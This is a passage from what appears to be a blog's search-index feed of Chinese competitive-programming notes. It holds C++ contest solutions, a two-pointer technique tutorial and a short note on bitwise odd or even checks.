class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;algorithm&gt;</span></span><br><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">int</span> a[<span class="hljs-number">1000</span>+<span class="hljs-number">5</span>];<br><span class="hljs-type">int</span> n;<br><span class="hljs-built_in">cin</span>&gt;&gt;n;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>&#123;<br><span class="hljs-built_in">cin</span>&gt;&gt;a[i];<br>&#125;<br>sort(a+<span class="hljs-number">1</span>, a+<span class="hljs-number">1</span>+n);<br><span class="hljs-type">int</span> ans=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=n;i&gt;=<span class="hljs-number">1</span>;i--)<br>&#123;<br><span class="hljs-keyword">if</span>(a[i]&gt;=ans+<span class="hljs-number">1</span>)<br>&#123;<br>ans++;<br>&#125;<br><span class="hljs-keyword">else</span><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-built_in">cout</span>&lt;&lt;ans;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="J-最大值"><a href="#J-最大值" class="headerlink" title="J.最大值"></a>J.最大值</h1><p><em><strong>注意：此题用C++输入输出会超时</strong></em></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstdio&gt;</span></span><br><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> MAXN=<span class="hljs-number">2e5</span>+<span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> a[MAXN];<br><span class="hljs-type">int</span> times=<span class="hljs-number">0</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">int</span> n;<br><span class="hljs-keyword">while</span>(<span class="hljs-built_in">cin</span>&gt;&gt;n)<br>&#123;<br><span class="hljs-type">int</span> maxn=<span class="hljs-number">0</span>,next=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>&#123;<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;a[i]);<br>maxn=max(maxn, a[i]);<br>&#125;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>&#123;<br><span class="hljs-keyword">if</span>(a[i]==maxn)<br>&#123;<br>times++;<br><span class="hljs-keyword">continue</span>;<br>&#125;<br>next=max(next, a[i]);<br>&#125;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>&#123;<br><span class="hljs-keyword">if</span>(a[i]&gt;=maxn &amp;&amp; times&lt;=<span class="hljs-number">1</span>)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, next);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, maxn);<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="K-循环排列-待补"><a href="#K-循环排列-待补" class="headerlink" title="K.循环排列(待补)"></a>K.循环排列(待补)</h1><h1 id="L-库特与围棋-待补"><a href="#L-库特与围棋-待补" class="headerlink" title="L.库特与围棋(待补)"></a>L.库特与围棋(待补)</h1>]]></content>
      
      
      
        <tags>
            
            <tag> ACM </tag>
            
            <tag> NEFU </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ACM-学习记录-尺取法</title>
      <link href="/2020/12/e3871ff6.html"/>
      <url>/2020/12/e3871ff6.html</url>
      
        <content type="html"><![CDATA[<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p><strong>给定一个数组和一个数s，在这个数组中找一个区间，使得这个区间之和等于s。</strong></p><p><strong>例如：给定的数组int x[14] &#x3D; {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14};和一个s &#x3D; 15。那么，可以找到的区间就应该有0到4， 3到5， 6到7.（注意这里的下标从0开始）</strong></p><span id="more"></span><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>对于这样的题，不用任何技巧就可以跑出结果，例如下面这个方法可能是大多数人能够想出来的：</p><p>先用一个数组sum[i]存放前i个元素的和，其实现用的是”递推思想“，注意，在编程中”递推“的思想用的特别多，一定要习惯这种思维方式。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">sum[<span class="hljs-number">0</span>] = x[<span class="hljs-number">0</span>];<span class="hljs-comment">//x为给定的原数组</span><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; n; i++)&#123;<br>   sum[i] += sum[i<span class="hljs-number">-1</span>];<span class="hljs-comment">//递推思想</span><br>&#125;<br></code></pre></td></tr></table></figure><p>然后通过两层循环求解</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = n<span class="hljs-number">-1</span>; j &gt;= <span class="hljs-number">0</span>; j--)&#123;<br><span class="hljs-keyword">if</span>(sum[j]-sum[i]==s)<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d---%d\n&quot;</span>, i, j);<br>&#125;<br></code></pre></td></tr></table></figure><p>上面的方法当然是可行的，但是复杂度太高，有一个算法可以将其复杂度降为O(n)。这就是”尺取算法“。</p><p>尺取法：顾名思义，像尺子一样取一段，借用挑战书上面的话说，尺取法通常是对数组保存一对下标，即所选取的区间的左右端点，然后根据实际情况不断地推进区间左右端点以得出答案。之所以需要掌握这个技巧，是因为尺取法比直接暴力枚举区间效率高很多，尤其是数据量大的。</p><p>那么，用”尺取法“做上面这道题思路应该是这样的：</p><p>其实，这种方法很类似于蚯蚓的蠕动。</p><p>1）用一对脚标i, j。最开始都指向第一个元素。</p><p>2）如果区间i到j之和比s小，就让j往后挪一位，并把sum的值加上这个新元素。相当于蚯蚓的头向前伸了一下。</p><p>3）如果区间i到j之和比s大，就让sum减掉第一个元素。相当于蚯蚓的尾巴向前缩了一下。</p><p>4）如果i到j之和刚好等于s，则输入。</p><h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstdio&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">findSUM</span><span class="hljs-params">(<span class="hljs-type">int</span> *A, <span class="hljs-type">int</span> n, <span class="hljs-type">int</span> s)</span>&#123;<br><span class="hljs-type">int</span> i = <span class="hljs-number">0</span>, j = <span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> sum = A[<span class="hljs-number">0</span>];<br><span class="hljs-keyword">while</span>(i &lt;= j &amp;&amp; j &lt; n)&#123;<br><span class="hljs-keyword">if</span>(sum &gt;= s)&#123;<br><span class="hljs-keyword">if</span>(sum == s)<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d---%d\n&quot;</span>, i, j);<br>sum -= A[i];<br>i++;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>j++;<br>sum += A[j];<br>&#125;<br>&#125;<br>&#125; <br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-built_in">std</span>::ios::sync_with_stdio(<span class="hljs-literal">false</span>);<br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cin</span>.tie(<span class="hljs-number">0</span>);<br>    <span class="hljs-type">int</span> m;<br>    <span class="hljs-type">int</span> x[<span class="hljs-number">14</span>] = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>, <span class="hljs-number">11</span>, <span class="hljs-number">12</span>, <span class="hljs-number">13</span>, <span class="hljs-number">14</span>&#125;;<br>    <span class="hljs-built_in">cin</span> &gt;&gt; m;<br>    findSUM(x, <span class="hljs-number">14</span>, m);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ACM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ACM-位运算符-判断奇偶</title>
      <link href="/2020/12/30561a0d.html"/>
      <url>/2020/12/30561a0d.html</url>
      
        <content type="html"><![CDATA[<p>同样一个问题，位运算可以提高程序的运行效率。</p><p>下面讲一下关于奇偶性的判断。</p><p>常规方法</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">static</span> boolean <span class="hljs-title">isOdd</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span></span>&#123;<br><br>​    <span class="hljs-keyword">return</span> i % <span class="hljs-number">2</span> != <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>位运算方法</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">static</span> boolean <span class="hljs-title">isOdd</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span></span>&#123;<br><br>​    <span class="hljs-keyword">return</span> (i &amp; <span class="hljs-number">1</span>) != <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>说明：</p><p>我们知道计算机中的数字通常用二进制补码表示。</p><p>如果为正数，补码与原码相同，直接看最后一位（因为数字1的前面N位均为0，跟它做与运算，前面肯定为0），奇数为1，偶数为0，与1相与，结果不变。</p><p>如果为负数，补码转原码：保持符号位不动，其它各位取反+1，即为负数的绝对值原码全部取反+1。还是看最后1位，先取反，再+1，结果还是和原来相同。进行与运算时还是原来的末位，所以用跟1做与运算还是保持原来的结果。</p>]]></content>
      
      
      
        <tags>
            
            <tag> ACM </tag>
            
            <tag> 位运算 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ACM-刷题记录-14届NEFU校赛</title>
      <link href="/2020/12/77f448c2.html"/>
      <url>/2020/12/77f448c2.html</url>
      
        <content type="html"><![CDATA[<h1 id="P2031凯撒密码"><a href="#P2031凯撒密码" class="headerlink" title="P2031凯撒密码"></a>P2031凯撒密码</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>string s;<br><span class="hljs-type">int</span> d;<br><span class="hljs-keyword">while</span>(cin&gt;&gt;s)<br>&#123;<br>cin&gt;&gt;d;<br><span class="hljs-type">int</span> len=s.<span class="hljs-built_in">length</span>();<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;len;i++)<br>&#123;<br>s[i]=s[i]-<span class="hljs-string">&#x27;a&#x27;</span>-d;<br><span class="hljs-keyword">if</span>(s[i]&lt;<span class="hljs-number">0</span>)s[i]=<span class="hljs-number">26</span>+s[i];<br>s[i]=s[i]%<span class="hljs-number">26</span>+<span class="hljs-string">&#x27;a&#x27;</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, s[i]);<br>&#125;<br>cout&lt;&lt;endl;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><span id="more"></span><h1 id="P2033神秘数字"><a href="#P2033神秘数字" class="headerlink" title="P2033神秘数字"></a>P2033神秘数字</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-type">long</span> <span class="hljs-type">long</span> n,m,ans=<span class="hljs-number">0</span>;<br>cin&gt;&gt;n&gt;&gt;m;<br><span class="hljs-comment">//cout&lt;&lt;pow(10,n)&lt;&lt;endl&lt;&lt;pow(10,n+1)&lt;&lt;endl;</span><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-built_in">pow</span>(<span class="hljs-number">10</span>,n<span class="hljs-number">-1</span>);i&lt;<span class="hljs-built_in">pow</span>(<span class="hljs-number">10</span>,n);i++)<br>&#123;<br><span class="hljs-type">int</span> num=i,sum=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">while</span>(num)<br>&#123;<br>sum+=num%<span class="hljs-number">10</span>;<br>num/=<span class="hljs-number">10</span>;<br>&#125;<br><span class="hljs-keyword">if</span>(sum==m)<br>&#123;<br><span class="hljs-comment">//cout&lt;&lt;i&lt;&lt;endl;</span><br>ans+=i;<br>&#125;<br>&#125;<br>cout&lt;&lt;ans&lt;&lt;endl;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="P100-快来找一找"><a href="#P100-快来找一找" class="headerlink" title="P100 快来找一找"></a>P100 快来找一找</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstdio&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-type">int</span> m,maxnum=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">while</span>(cin&gt;&gt;m)<br>&#123;<br><span class="hljs-type">int</span> tmp;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;m;i++)<br>&#123;<br>cin&gt;&gt;tmp;<br>maxnum=<span class="hljs-built_in">max</span>(maxnum,tmp);<br>&#125;<br>cout&lt;&lt;maxnum&lt;&lt;endl;<br>maxnum=<span class="hljs-number">0</span>;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="P2034-第几个质数"><a href="#P2034-第几个质数" class="headerlink" title="P2034 第几个质数"></a>P2034 第几个质数</h1><p>老夫还是不用筛</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">int</span> prime[<span class="hljs-number">1000</span>+<span class="hljs-number">5</span>];<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">isprime</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">if</span>(prime[x]!=<span class="hljs-number">-1</span>)<span class="hljs-keyword">return</span> prime[x];<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">2</span>;i&lt;=<span class="hljs-built_in">sqrt</span>(x);i++)<br>&#123;<br><span class="hljs-keyword">if</span>(x%i==<span class="hljs-number">0</span>)<span class="hljs-keyword">return</span> prime[x]=<span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-keyword">return</span> prime[x]=<span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-type">int</span> n,number=<span class="hljs-number">1</span>;<br><span class="hljs-built_in">memset</span>(prime, <span class="hljs-number">-1</span>, <span class="hljs-built_in">sizeof</span>(prime));<br>prime[<span class="hljs-number">1</span>]=<span class="hljs-number">0</span>;prime[<span class="hljs-number">2</span>]=<span class="hljs-number">1</span>;<br><span class="hljs-keyword">while</span>(cin&gt;&gt;n)<br>&#123;<br><span class="hljs-keyword">if</span>(!<span class="hljs-built_in">isprime</span>(n))<br>&#123;<br>cout&lt;&lt;<span class="hljs-string">&quot;NO&quot;</span>&lt;&lt;endl;<br><span class="hljs-keyword">continue</span>;<br>&#125;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;n;i++)<br>&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-built_in">isprime</span>(i))<br>&#123;<br>number++;<br>&#125;<br>&#125;<br>cout&lt;&lt;number&lt;&lt;endl;<br>number=<span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="P2039-why的概率论"><a href="#P2039-why的概率论" class="headerlink" title="P2039 why的概率论"></a>P2039 why的概率论</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-type">int</span> t,x,y;<br>cin&gt;&gt;t;<br><span class="hljs-keyword">while</span>(t--)<br>&#123;<br>cin&gt;&gt;x&gt;&gt;y;<br><span class="hljs-keyword">if</span>(!x)cout&lt;&lt;<span class="hljs-string">&quot;0 / 1&quot;</span>&lt;&lt;endl;<br><span class="hljs-keyword">else</span><br>&#123;<br>y+=x;<br>x*=<span class="hljs-number">4</span>;<br>cout&lt;&lt;x/__gcd(x,y)&lt;&lt;<span class="hljs-string">&quot; / &quot;</span>&lt;&lt;y/__gcd(x,y)&lt;&lt;endl;<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="P2065-小x爱料理"><a href="#P2065-小x爱料理" class="headerlink" title="P2065 小x爱料理"></a>P2065 小x爱料理</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-type">int</span> t;<br>cin&gt;&gt;t;<br><span class="hljs-keyword">while</span>(t--)<br>&#123;<br><span class="hljs-type">int</span> u,v,w,a,b,c;<br><span class="hljs-type">int</span> n1,n2,n3,ans;<br>cin&gt;&gt;u&gt;&gt;v&gt;&gt;w&gt;&gt;a&gt;&gt;b&gt;&gt;c;<br>n1=u/a;<br>n2=v/b;<br>n3=w/c;<br>ans=<span class="hljs-built_in">min</span>(n1, <span class="hljs-built_in">min</span>(n2, n3));<br>cout&lt;&lt;ans&lt;&lt;endl;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="库特的鸽鸽们"><a href="#库特的鸽鸽们" class="headerlink" title="库特的鸽鸽们"></a>库特的鸽鸽们</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><br>using namespace <span class="hljs-built_in">std</span>;<br><br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> MAXN=<span class="hljs-number">2e5</span>+<span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> n,q,a[MAXN],c[MAXN],p[MAXN],maxn[MAXN];<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-built_in">cin</span>&gt;&gt;n;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>&#123;<br><span class="hljs-built_in">cin</span>&gt;&gt;a[i];<br>&#125;<br><span class="hljs-built_in">cin</span>&gt;&gt;q;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=q;i++)<br>&#123;<br><span class="hljs-type">int</span> op,x,y;<br><span class="hljs-built_in">cin</span>&gt;&gt;op;<br><span class="hljs-keyword">if</span>(op==<span class="hljs-number">1</span>)<br>&#123;<br><span class="hljs-built_in">cin</span>&gt;&gt;x&gt;&gt;y;<br>c[x]=y;<br>p[x]=i;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-built_in">cin</span>&gt;&gt;maxn[i];<br>&#125;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=q<span class="hljs-number">-1</span>;i&gt;=<span class="hljs-number">1</span>;i--)<br>&#123;<br>maxn[i]=max(maxn[i], maxn[i+<span class="hljs-number">1</span>]);<br>&#125;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>&#123;<br><span class="hljs-keyword">if</span>(p[i])<span class="hljs-built_in">cout</span>&lt;&lt;max(c[i], maxn[p[i]])&lt;&lt;<span class="hljs-string">&quot; &quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-built_in">cout</span>&lt;&lt;max(maxn[<span class="hljs-number">1</span>], a[i])&lt;&lt;<span class="hljs-string">&quot; 